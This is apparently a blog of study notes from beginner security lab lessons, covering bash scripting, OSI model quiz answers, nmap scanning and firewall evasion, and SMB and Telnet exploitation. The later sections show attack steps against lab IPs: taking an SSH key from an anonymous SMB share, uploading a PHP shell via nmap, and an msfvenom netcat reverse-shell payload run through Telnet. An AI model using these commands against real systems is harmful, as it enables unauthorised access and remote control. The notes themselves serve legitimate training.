<h3 id="Bash-Scripting"><a href="#Bash-Scripting" class="headerlink" title="Bash Scripting"></a>Bash Scripting</h3><p><a target="_blank" rel="noopener" href="https://devhints.io/bash">https://devhints.io/bash</a></p>
<p>A bash script always starts with the following line of code at the top of the script.</p>
<p>This is so your shell (whatever type of it) knows that it needs to run your file using bash in the terminal.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br></pre></td></tr></table></figure>

<p>This will return the string “Hello World”. The command “<code>echo</code>” is used to output text to the screen, the same way as “<code>print</code>” in python. I suggest you test this out in your terminal to get to grips with bash!</p>
<p>You can also perform normal Linux commands inside your bash script and it will be executed if formatted right. For example we can run the command “<code>ls</code>” inside our bash script and we will see the output when we run the file. So lets make it do this!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;Hello World!&quot;</span><br><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure>

<p>Now we are moving onto variables,</p>
<p>in bash these are quite simple and we create them like so: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=&quot;daigua&quot;</span><br><span class="line">echo $name</span><br></pre></td></tr></table></figure>

<p>The section between <code>set -x</code> and <code>set +x</code> will be debugged</p>
<p>Lets start by declaring a parameter that is going to be our first argument when running our bash script.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=$1</span><br><span class="line">echo $name</span><br></pre></td></tr></table></figure>

<p> <code>./example.sh Alex</code>		And sure enough we get returned with “Alex”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">Enter you name</span><br><span class="line">name1=$1</span><br><span class="line">name2=$2</span><br><span class="line">echo &quot;Hello &quot;$name1&quot; &quot;$name2</span><br></pre></td></tr></table></figure>


<p>How can we get the number of arguments supplied to a script?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$#</span><br></pre></td></tr></table></figure>

<p>How can we get the filename of our current script(aka our first argument)?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$0</span><br></pre></td></tr></table></figure>

<p>How can we get the 4th argument supplied to the script?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$4</span><br></pre></td></tr></table></figure>

<p>If a script asks us for input how can we direct our input into a variable called ‘test’ using “read”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read test        //https://www.cnblogs.com/xiangzi888/archive/2012/03/27/2420084.html</span><br></pre></td></tr></table></figure>

<p>What will the output of “echo $1 $3” if the script was ran with “.&#x2F;script.sh hello hola aloha”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello aloha</span><br></pre></td></tr></table></figure>



<p>We have the variable name, in our case ‘transport’</p>
<p>We then wrap each item in brackets leaving a space between each item.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transport=(&#x27;car&#x27; &#x27;train&#x27; &#x27;bike&#x27; &#x27;bus&#x27;)</span><br></pre></td></tr></table></figure>

<p>We can then echo out all the elements in our array like this:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;$&#123;transport[@]&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>You can try this in your own terminal and see what it outputs.</p>
<p>Where the “@” means all arguments, and the [] wrapped around it specifies its index.</p>
<p>So what if we wanted to print out the item <code>train</code>.</p>
<p>We would simply type:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;$&#123;transport[1]&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>because the train is at index position 1.</p>
<p>The last thing we will cover is if we want to change an element, or delete it. If we wanted to remove an element we would use the <code>unset</code> utility.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unset transport[1]</span><br></pre></td></tr></table></figure>

<p>This now removes the <code>train</code> item, if we wanted to we could echo it back out and see that it is indeed gone,</p>
<p>Now lets set it to something else. We can do:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transport[1]=&#x27;trainride&#x27;</span><br></pre></td></tr></table></figure>

<p>If we echo the array then we get:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">car trainride bike bus</span><br></pre></td></tr></table></figure>

<p>As a little side project try building on your previous project of a biography maker, include arrays so that you can store multiple names and multiple facts about the person. Then in the next module we can expand even further.Given the array please answer the following questions<code>cars=(&#39;honda&#39; &#39;audi&#39; &#39;bmw&#39; &#39;tesla&#39;)</code></p>
<p>Answer the questions below</p>
<p>What would be the command to print audi to the screen using indexing.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;$&#123;cars[1]&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>If we wanted to remove tesla from the array how would we do so?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unset cars[3]</span><br></pre></td></tr></table></figure>

<p>How could we insert a new value called toyota to replace tesla?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cars[3]=&#x27;toyota&#x27;</span><br></pre></td></tr></table></figure>



<p>We will make a simple “if” statement to check if a variable is equal to a value, we will also make a script that checks if a file exists and that it is writeable, if it is we will write a message to that file, if not writeable it will delete it and make a new one. A Lot of new things will be taught here so pay attention.</p>
<p>If statements always use a pair of brackets and in the case of the [] we need to leave a space on both sides of the text(the bash syntax). We also always need to end the if statement with <code>fi</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">count=10</span><br><span class="line">if [ $count -eq 10 ]</span><br><span class="line">then </span><br><span class="line">	echo &quot;true&quot;</span><br><span class="line">else</span><br><span class="line">	echo &quot;false&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><strong>Operator</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-eq</td>
<td>Checks if the value of two operands are equal or not; if yes, then the condition becomes true.———equal</td>
</tr>
<tr>
<td>-ne</td>
<td>Checks if the value of two operands are equal or not; if values are not equal, then the condition becomes true.———-not equal</td>
</tr>
<tr>
<td>-gt</td>
<td>Checks if the value of left operand is greater than the value of right operand; if yes, then the condition becomes true.————–greater than</td>
</tr>
<tr>
<td>-lt</td>
<td>Checks if the value of left operand is less than the value of right operand; if yes, then the condition becomes true.————-less than</td>
</tr>
<tr>
<td>-ge</td>
<td>Checks if the value of left operand is greater than or equal to the value of right operand; if yes, then the condition becomes true.—————–greater or equal</td>
</tr>
</tbody></table>
<p>Now let’s create another script where we will use 2 conditions simultaneously and coming back to a concept we learnt in the first lesson.</p>
<p>Let’s begin.</p>
<p>We want to make a script that we will perform on a file given by a <strong>parameter</strong>.</p>
<p>We then check if it exists and if it has <strong>write</strong> permissions. If it has write perms then we echo “<strong>hello</strong>” to it. If it is either non-accessible or doesn’t exist we will create the file and echo “hello” to it. Let’s begin!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">filename=$1</span><br><span class="line">if [ -f $filename ] &amp;&amp; [ -w $filename ]</span><br><span class="line">then</span><br><span class="line">	echo &quot;Hello world!&quot; &gt; $filename</span><br><span class="line">else</span><br><span class="line">	touch &quot;$filename&quot;</span><br><span class="line">	echo &quot;Hello world!&quot; &gt;&gt; $filename</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>The <strong>-f</strong> checked if the file existed.</p>
<p>The <strong>-w</strong> checked if the file was writable, without write permissions we wouldn’t be able to output our text into the file.</p>
<p>What is the flag to check if we have read access to a file?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r</span><br></pre></td></tr></table></figure>

<p>What is the flag to check to see if it’s a directory?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-d</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cyberciti.biz/faq/bash-for-loop/">https://www.cyberciti.biz/faq/bash-for-loop/</a></p>
<h1 id="Network-Exploitation-Basics"><a href="#Network-Exploitation-Basics" class="headerlink" title="Network Exploitation Basics"></a>Network Exploitation Basics</h1><h3 id="Introductory-Networking"><a href="#Introductory-Networking" class="headerlink" title="Introductory Networking"></a>Introductory Networking</h3><p><strong>A</strong>nxious  <strong>P</strong>ale <strong>S</strong>hakespeare <strong>T</strong>reated Nervous <strong>D</strong>runks <strong>P</strong>atiently.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Application     </span><br><span class="line">Presentation </span><br><span class="line">Session</span><br><span class="line">Transport</span><br><span class="line">Network</span><br><span class="line">DataLink</span><br><span class="line">Physical</span><br></pre></td></tr></table></figure>

<p>Which layer would choose to send data over TCP or UDP?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure>

<p>Which layer checks received packets to make sure that they haven’t been corrupted?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>

<p>In which layer would data be formatted in preparation for transmission?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>

<p>Which layer transmits and receives data?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure>

<p>Which layer encrypts, compresses, or otherwise transforms the initial data to give it a standardised format?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure>

<p>Which layer tracks communications between the host and receiving computers?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure>

<p>Which layer accepts communication requests from applications?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure>

<p>Which layer handles logical addressing?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>

<p>When sending data over TCP, what would you call the “bite-sized” pieces of data?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">segments      //USP----datagrams</span><br></pre></td></tr></table></figure>

<p><strong>[Research]</strong> Which layer would the FTP protocol communicate with?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure>

<p>Which transport layer protocol would be best suited to transmit a live video?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UDP</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221126192233273.png" alt="image-20221126192233273"></p>
<p>How would you refer to data at layer 2 of the encapsulation process (with the OSI model)?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Frames</span><br></pre></td></tr></table></figure>

<p>How would you refer to data at layer 4 of the encapsulation process (with the OSI model), if the UDP protocol has been selected?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Datagrams</span><br></pre></td></tr></table></figure>

<p>What process would a computer perform on a received message?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De-encapsulation</span><br></pre></td></tr></table></figure>

<p>Which is the only layer of the OSI model to add a <em>trailer</em> during encapsulation?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Data Link</span><br></pre></td></tr></table></figure>

<p>Does encapsulation provide an extra layer of security <strong>(Aye&#x2F;Nay)</strong>?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aye</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221126202156600.png" alt="image-20221126202156600"></p>
<p>Which model was introduced first, OSI or TCP&#x2F;IP?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TCP/IP</span><br></pre></td></tr></table></figure>

<p>Which layer of the TCP&#x2F;IP model covers the functionality of the Transport layer of the OSI model <strong>(Full Name)</strong>?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transport</span><br></pre></td></tr></table></figure>

<p>Which layer of the TCP&#x2F;IP model covers the functionality of the Session layer of the OSI model <strong>(Full Name)</strong>?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Application</span><br></pre></td></tr></table></figure>

<p>The Network Interface layer of the TCP&#x2F;IP model covers the functionality of two layers in the OSI model. These layers are Data Link, and?.. <strong>(Full Name)</strong>?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Physical</span><br></pre></td></tr></table></figure>

<p>Which layer of the TCP&#x2F;IP model handles the functionality of the OSI network layer?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Internet</span><br></pre></td></tr></table></figure>

<p>What kind of protocol is TCP?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connection-based</span><br></pre></td></tr></table></figure>

<p>What is SYN short for?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">synchronise</span><br></pre></td></tr></table></figure>

<p>What is the second step of the three way handshake?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYN/ACK</span><br></pre></td></tr></table></figure>

<p>What is the short name for the “Acknowledgement” segment in the three-way handshake?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACK</span><br></pre></td></tr></table></figure>



<p>ping :  Network layer of the OSI Model</p>
<p>ping -h &#x2F; man ping</p>
<p>traceroute</p>
<p>The logical follow-up to the ping command is ‘traceroute’. Traceroute can be used to map the path your request takes as it heads to the target machine.</p>
<p>whois</p>
<p>dig google.com @1.1.1.1</p>
<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>ps : -sC   -sV          -A</p>
<p>What networking constructs are used to direct traffic to the right application on a server?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ports</span><br></pre></td></tr></table></figure>

<p>How many of these are available on any network-enabled computer?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">65535</span><br></pre></td></tr></table></figure>

<p><strong>[Research]</strong> How many of these are considered “well-known”? (These are the “standard” numbers mentioned in the task)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1024</span><br></pre></td></tr></table></figure>

<p> -sT            &#x2F;&#x2F;TCP</p>
<p>-sS             &#x2F;&#x2F;SYN，faster，root，make service down</p>
<p>Half-open,Stealth</p>
<p>-sU             &#x2F;&#x2F;UDP，difficult to identify whether a UDP port is actually open，always restrict the number of ports</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --top-ports 20 &lt;target&gt;</span><br></pre></td></tr></table></figure>



<p>NULL, FIN and Xmas TCP port scans are less commonly used than any of the others we’ve covered already, so we will not go into a huge amount of depth here. All three are interlinked and are used primarily as they tend to be even stealthier, relatively speaking, than a SYN “stealth” scan. Beginning with NULL scans:</p>
<p>-sN              &#x2F;&#x2F;sent with no flags set at all</p>
<p>-sF              &#x2F;&#x2F;sending a completely empty packet</p>
<p>-sX             &#x2F;&#x2F;send a malformed TCP packet</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.0.1-254</span><br><span class="line">nmap -sn 192.168.0.0/24</span><br></pre></td></tr></table></figure>

<p>The <code>-sn</code> switch tells Nmap not to scan any ports – forcing it to rely primarily on ICMP echo packets (or ARP requests on a local network, if run with sudo or directly as the root user) to identify targets. In addition to the ICMP echo requests, the <code>-sn</code> switch will also cause nmap to send a TCP SYN packet to port 443 of the target, as well as a TCP ACK (or TCP SYN if not run as root) packet to port 80 of the target.</p>
<p>The <strong>N</strong>map <strong>S</strong>cripting <strong>E</strong>ngine (NSE) is an incredibly powerful addition to Nmap, extending its functionality quite considerably. NSE Scripts are written in the <em>Lua</em> programming language, and can be used to do a variety of things: from scanning for vulnerabilities, to automating exploits for them. The NSE is particularly useful for reconnaisance, however, it is well worth bearing in mind how extensive the script library is.</p>
<p>There are many categories available. Some useful categories include:</p>
<ul>
<li><code>safe</code>:- Won’t affect the target</li>
<li><code>intrusive</code>:- Not safe: likely to affect the target</li>
<li><code>vuln</code>:- Scan for vulnerabilities</li>
<li><code>exploit</code>:- Attempt to exploit a vulnerability</li>
<li><code>auth</code>:- Attempt to bypass authentication for running services (e.g. Log into an FTP server anonymously)</li>
<li><code>brute</code>:- Attempt to bruteforce credentials for running services</li>
<li><code>discovery</code>:- Attempt to query running services for further information about the network (e.g. query an SNMP</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 --script http-put --script-args http-put.url=&#x27;/dav/shell.php&#x27;,http-put.file=&#x27;./shell.php&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script-help=ftp-anon.nse</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/nmap/scripts</span><br><span class="line"></span><br><span class="line">/usr/share/nmap/scripts/script.db</span><br><span class="line"></span><br><span class="line">grep &quot;ftp&quot; /usr/share/nmap/scripts/script.db</span><br><span class="line"></span><br><span class="line">ls -l /usr/share/nmap/scripts/*ftp*</span><br><span class="line"></span><br><span class="line">grep &quot;safe&quot; /usr/share/nmap/scripts/script.db</span><br><span class="line"></span><br><span class="line">sudo apt update &amp;&amp; sudo apt install nmap</span><br></pre></td></tr></table></figure>



<p>-Pn</p>
<p>We have already seen some techniques for bypassing firewalls (think stealth scans, along with NULL, FIN and Xmas scans); however, there is another very common firewall configuration which it’s imperative we know how to bypass.</p>
<p>Your typical Windows host will, with its default firewall, block all ICMP packets. This presents a problem: not only do we often use <em>ping</em> to manually establish the activity of a target, Nmap does the same thing by default. This means that Nmap will register a host with this firewall configuration as dead and not bother scanning it at all.</p>
<p>The following switches are of particular note:</p>
<ul>
<li><code>-f</code>:- Used to fragment the packets (i.e. split them into smaller pieces) making it less likely that the packets will be detected by a firewall or IDS.</li>
<li>An alternative to <code>-f</code>, but providing more control over the size of the packets: <code>--mtu &lt;number&gt;</code>, accepts a maximum transmission unit size to use for the packets sent. This <em>must</em> be a multiple of 8.</li>
<li><code>--scan-delay &lt;time&gt;ms</code>:- used to add a delay between packets sent. This is very useful if the network is unstable, but also for evading any time-based firewall&#x2F;IDS triggers which may be in place.</li>
<li><code>--badsum</code>:- this is used to generate in invalid checksum for packets. Any real TCP&#x2F;IP stack would drop this packet, however, firewalls may potentially respond automatically, without bothering to check the checksum of the packet. As such, this switch can be used to <strong>determine the presence of a firewall&#x2F;IDS.</strong></li>
</ul>
<h3 id="Network-Services"><a href="#Network-Services" class="headerlink" title="Network Services"></a>Network Services</h3><p>SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. [<a target="_blank" rel="noopener" href="https://searchnetworking.techtarget.com/definition/Server-Message-Block-Protocol">source</a>]</p>
<p>Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.</p>
<p>The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP&#x2F;IP (actually NetBIOS over TCP&#x2F;IP as specified in RFC1001 and RFC1002), NetBEUI or IPX&#x2F;SPX.</p>
<p>What does SMB stand for?  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server Message Block</span><br></pre></td></tr></table></figure>

<p>What type of protocol is SMB?  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response-request</span><br></pre></td></tr></table></figure>

<p>What do clients connect to servers using?  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp/ip</span><br></pre></td></tr></table></figure>

<p>What systems does Samba run on?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix</span><br></pre></td></tr></table></figure>

<p><strong>SMB</strong></p>
<p>Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information — you’d be surprised what is sometimes included on these shares.</p>
<p><strong>Enum4Linux</strong></p>
<p>Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It’s installed by default on Parrot and Kali, however if you need to install it, you can do so from the official <a target="_blank" rel="noopener" href="https://github.com/portcullislabs/enum4linux">github</a>.</p>
<p>The syntax of Enum4Linux is nice and simple: <strong>“enum4linux [options] ip”</strong></p>
<p><strong>TAG</strong>      <strong>FUNCTION</strong></p>
<p>-U       get userlist<br>-M       get machine list<br>-N       get namelist dump (different from -U and-M)<br>-S       get sharelist<br>-P       get password policy information<br>-G       get group and member list</p>
<p>-a       all of the above (full basic enumeration)</p>
<p>Now we understand our enumeration tools, let’s get started!</p>
<p>**Types of SMB Exploit<br>**</p>
<p>While there are vulnerabilities such as <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2017-7494/">CVE-2017-7494</a> that can allow remote code execution by exploiting SMB, you’re more likely to encounter a situation where the best way into a system is due to misconfigurations in the system. In this case, we’re going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.</p>
<p><strong>Method Breakdown</strong></p>
<p>So, from our enumeration stage, we know:</p>
<p>  - The SMB share location</p>
<p>  - The name of an interesting SMB share</p>
<p><strong>SMBClient</strong></p>
<p>Because we’re trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it’s part of the default samba suite. While it is available by default on Kali and Parrot, if you do need to install it, you can find the documentation <a target="_blank" rel="noopener" href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">here.</a></p>
<p>We can remotely access the SMB share using the syntax:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //[IP]/[SHARE]</span><br></pre></td></tr></table></figure>

<p>Followed by the tags:</p>
<p>-U [name] : to specify the user</p>
<p>-p [port] : to specify the port</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 10.10.56.29</span><br><span class="line">smbclient //10.10.56.29/profiles -U Anonymous</span><br><span class="line">get id_ras</span><br><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa cactus@10.10.56.29</span><br></pre></td></tr></table></figure>

<p><strong>What is Telnet?</strong></p>
<p>Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that’s hosting a telnet server.</p>
<p>The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.</p>
<p><strong>Replacement</strong></p>
<p>Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.</p>
<p><em><strong>*How does Telnet work?*</strong></em></p>
<p>The user connects to the server by using the Telnet protocol, which means entering <strong>“telnet”</strong> into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: <strong>“telnet [ip] [port]”</strong></p>
<p>Let’s start out the same way we usually do, a port scan, to find out as much information as we can about the services, applications, structure and operating system of the target machine. Scan the machine with <strong>nmap.</strong></p>
<ul>
<li><code>-A</code>: 启用操作系统检测、版本检测、脚本扫描和 Traceroute 合而为一</li>
<li><code>-p-</code>：启用扫描所有端口，而不仅仅是前 1000 个</li>
</ul>
<p>Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE’s for Telnet client and server systems, however, so when exploiting you can check for those on:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cvedetails.com/">https://www.cvedetails.com/</a></li>
<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/">https://cve.mitre.org/</a></li>
</ul>
<p>So, from our enumeration stage, we know:</p>
<p>  - There is a poorly hidden telnet service running on this machine</p>
<p>  - The service itself is marked “backdoor”</p>
<p>  - We have possible username of “Skidy” implicated</p>
<p>Using this information, let’s try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p-v 10.10.43.169</span><br><span class="line">telnet 10.10.43.169 8012</span><br><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=10.10.37.196 lport=4444 R</span><br><span class="line">nc -lvp 4444</span><br><span class="line">.RUN mkfifo /tmp/gddlvkh; nc 10.10.37.196 4444 0&lt;/tmp/gddlvkh | /bin/sh &gt;/tmp/gddlvkh 2&gt;&amp;1; rm /tmp/gddlvkh</span><br></pre></td></tr></table></figure>



<p><strong>FTP</strong></p>
<p>The FTP server may support either Active or Passive connections, or both. </p>
<ul>
<li>In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. </li>
<li>In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.</li>
</ul>
<p>This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn’t be efficient for either large file transfers, or slow internet connections.</p>
